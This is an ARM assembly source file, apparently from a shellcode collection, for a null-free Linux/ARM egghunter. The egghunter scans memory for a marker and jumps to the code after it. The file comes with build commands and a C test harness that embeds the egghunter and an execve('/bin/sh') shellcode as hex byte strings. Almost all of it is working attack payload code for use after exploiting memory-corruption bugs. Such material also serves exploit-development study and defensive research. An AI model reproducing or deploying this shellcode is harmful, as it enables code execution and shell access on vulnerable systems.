/*
* Title:  Linux/ARM - Memsafe egghunter (0x50905090) + execve("/bin/sh").  Null free shellcode (60 bytes)
* Date:   2018-06-06
* Tested: armv7l (Raspberry Pi v3) and armv6l (Raspberry Pi Zero W)
* Author: rtmcx - twitter: @rtmcx
* Description:	The shellcode will search the memory for the "EGG" and, when found, redirect execution to the location just after the EGG.
*/

.text

.global _start

_start:
	.ARM

	/* Enter Thumb mode for shorter shellcode */
	add	r5, pc, #1
	bx	r5
	.THUMB

page_align:
	/* Enter ARM mode (to easier calculate and set pagesize) */
	mov	r5, pc
	bx	r5
	.ARM

	/* Memory page alignment. */
	mvn	r1, r1, lsr #0x0c
	mvn	r1, r1, lsl #0x0c

	/* Enter Thumb mode again */
	add	r5, pc, #1
	bx	r5
	.THUMB

hunting:
	add	r1, r1,	#1		// Go to next address

	ldr	r3, egg			// set r3 to eggs value

	// Setup syscall "sigaction"
	mov	r7, #0x43		// sigaction (syscall number 67, 0x43)
	svc	1			// Execute syscall (result is stored in r0)


	/* Compare the result */
	sub	r7, #0x51  		// Calculate r7 to become 0xF2 (0x43 - 0x51)
	cmp	r0, r7 			// Did we get EFAULT? (value 0xF2)
	beq	page_align		// Yes, invalid adddress, next page

	/* We have access to the page and can start to search for the egg.. */
	ldr	r2, [r1]		// Place the byte at address in r2
	cmp	r2, r3			// Compare the egg with address bytes
	bne	hunting			// Not the same, go to next byte


	/* Here we have either found the EGG or searched the entire memory.
	   If the EGG was not found, this will probably cause a SEGFAULT,
	   since the instruction that is executed next might be an invalid one. */

	/* Enter ARM mode */
	/* Since we dont know which type of shellcode that will be executed (it is up to the shellcode to set correct mode) */

	mov	r5, pc
	bx	r5

	.ARM
	/* Set PC to execute code at address*/
	mov	pc, r1			// Jump to shellcode (byte after egg)

egg:
	.ascii 	"\x50\x90\x50\x90"

/*
Compile and link with:
# as -o egghunter.o egghunter.s
# ld -N egghunter.o -o egghunter
Extract egghunter shellcode:
# objcopy -O binary egghunter egghunter.bin
# hexdump -v -e '"\\""x" 1/1 "%02x" ""' egghunter.bin

*/

//
// ------ egghunter-tester.c ------------------------
/*
#include <stdio.h>
#include <string.h>

//Compile with (on Raspberry Pi v3):
//gcc -N -static-libgcc egghunter-tester.c -o egghunter-tester


#define EGG "\x90\x50\x90\x50"
unsigned char egg[] = EGG;
unsigned char *egghunter = "\x01\x50\x8f\xe2\x15\xff\x2f\xe1\x7d\x46\x28\x47\x21\x16\xe0\xe1\x01\x16\xe0\xe1\x01\x50\x8f\xe2\x15\xff\x2f\xe1\x01\x31\x06\x4b\x43\x27\x01\xdf\x51\x3f\xb8\x42\xee\xd0\x0a\x68\x9a\x42\xf5\xd1\x7d\x46\x28\x47\x01\xf0\xa0\xe1\x50\x90\x50\x90";

// The shellcode to search for (in this case "execve('/bin/sh')")
unsigned char *shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x49\x40\x52\x40\x01\xa0"
"\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41";

void main()
{
    char buffer[200];

    strcpy(buffer, egg);
    strcpy(buffer+4, shellcode);

    printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
    printf("Shellcode Length (inc egg):  %d\n", strlen(buffer));
    printf("Stack location: %p\n",  buffer);

    int (*ret)() = (int(*)())egghunter;

    ret();
}
*/